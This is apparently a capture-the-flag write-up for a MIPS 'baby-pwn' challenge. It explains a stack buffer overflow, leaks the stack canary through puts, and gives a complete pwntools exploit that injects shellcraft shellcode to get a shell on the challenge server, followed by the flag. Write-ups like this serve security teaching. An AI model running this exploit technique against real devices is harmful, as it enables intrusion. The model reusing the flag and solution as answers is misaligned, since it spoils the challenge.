# No Risc, No Future

## baby-pwn - Points: 215

> We use microcontrollers to automate and conserve energy. IoT and stuff. Most of them don't use CISC architectures.
>
> Let's start learning another architecture today!
>
> [Download challenge files](no_risc_no_future_e06100f3fc1847eb06ed06749beeae25.zip)
>
> [Download challenge files including docker setup](no_risc_no_future_7cb1ade0963d2236d1cf6e58750be043.zip)

You were given a ELF 32-bit MIPS executable and `QEMU` binary that lets you easily run the program.

Running `checksec no_risc_no_future` shows the enabled security mechanisms:

	Arch:     mips-32-little
	RELRO:    Partial RELRO
	Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

Only stack canaries are enabled and since `NX` is disabled we have `RWX` segments what allows us to execute shellcode on the stack, if we find a buffer overflow.

Decompiling the MIPS binary in `Ghidra` shows what it is essentially doing:

```c
undefined4 main(void)
{
  int iStack80;
  char acStack76 [64];
  int iStack12;
  
  iStack12 = __stack_chk_guard;
  iStack80 = 0;
  while (iStack80 < 10) {
    read(0,acStack76,0x100);
    puts(acStack76);
    iStack80 = iStack80 + 1;
  }
  if (iStack12 != __stack_chk_guard) {
    __stack_chk_fail();
  }
  return 0;
}
```

The program `read`s up to 0x100 characters from `stdin` and prints that data out by using `puts`. This is repeated 10 times in the loop. Since the destination buffer for the input has only 64 characters size, we have a buffer overflow. To get code execution we can overwrite the `RIP` but since stack canaries are enabled, we have to leak that value before.

Stack canary values end with zero bytes what makes it more difficult to read them, since most functions stop at zero bytes because they identify the end of string.

The stack canary variable `__stack_chk_guard` lies in the memory right after the buffer for our input and `puts` will read the buffer till it encounters a zero byte. So if we overwrite the buffer, we would corrupt the canary value, but can overwrite that zero byte, so that `puts` will print out our buffer and the canary value! Since `read` terminates our input with `\xa0` (linefeed) we can fill the buffer with 64 bytes, and the linefeed will overwrite the zero byte of the canary value.

We have now bypassed the stack canary protection and can in the next turn completely overwrite the buffer and modify the `RIP` to jump right behind it where we place our shellcode. I debugged the binary in `gdb` and found `0x7ffffd40` as good address to jump to. MIPS shellcode generated with `shellcraft` worked quite good, I only had to add some `NOP`s before it.  

The full exploit code looks like this:

```python
from pwn import *


context.arch = 'mips'

shellcode = asm(shellcraft.mips.linux.sh())

# p = remote('localhost', 1338)
p = remote('noriscnofuture.forfuture.fluxfingers.net', 1338)

p.sendline('A'*64)
p.recvuntil('\n')

canary = u32('\x00'+p.recv(3))
p.recv(1)
log.info('canary: {}'.format(hex(canary)))

p.sendline('A'*64+p32(canary)+'A'*4+p32(0x7ffffd40)+'\x00'*16+shellcode)

for i in range(8):
	p.sendline('')
	p.recvuntil('\n\n')

p.interactive()
```

flag: `flag{indeed_there_will_be_no_future_without_risc}`